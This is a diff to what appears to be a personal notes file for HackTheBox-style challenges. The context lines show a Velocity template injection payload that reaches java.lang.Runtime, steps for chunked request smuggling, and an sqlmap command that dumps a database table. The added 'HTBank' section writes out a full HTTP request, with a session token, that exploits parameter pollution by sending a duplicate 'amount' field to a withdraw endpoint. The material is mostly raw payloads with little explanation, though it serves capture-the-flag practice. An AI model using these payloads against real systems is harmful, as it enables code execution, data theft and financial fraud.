@@ -43,3 +43,60 @@ text=text=#set($str = "") #set($runtime = $str.getClass().forName("java.lang.Run
     create a text file with Transfer-Encoding: chunked
     take a repeater request and insert all to a text file,and add Transfer-Encoding: chunked
     sqlmap -r <Filename> --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
+
+HTBank:
+
+    Exploiting Parameter Pollution Vulnerability
+    POST /api/withdraw HTTP/1.1
+
+Host: 83.136.254.223:30313
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://83.136.254.223:30313/home
+
+Content-Type: multipart/form-data; boundary=---------------------------388085167429586914953899034002
+
+Content-Length: 410
+
+Origin: http://83.136.254.223:30313
+
+Connection: close
+
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZXhwIjoxNzExMjYxNzI4fQ.jIrlN5fOJGSfwCrdPc7HBsJ08idilF9QkWFI-eQrfGQ
+
+
+
+-----------------------------388085167429586914953899034002
+
+Content-Disposition: form-data; name="account"
+
+
+
+test1
+
+-----------------------------388085167429586914953899034002
+
+Content-Disposition: form-data; name="amount"
+
+
+
+0
+
+-----------------------------388085167429586914953899034002
+
+        Content-Disposition: form-data; name="amount"
+
+
+
+        1337
+
+        -----------------------------388085167429586914953899034002--
+
+2 conditions for 1 parameter "amount"at the same time 
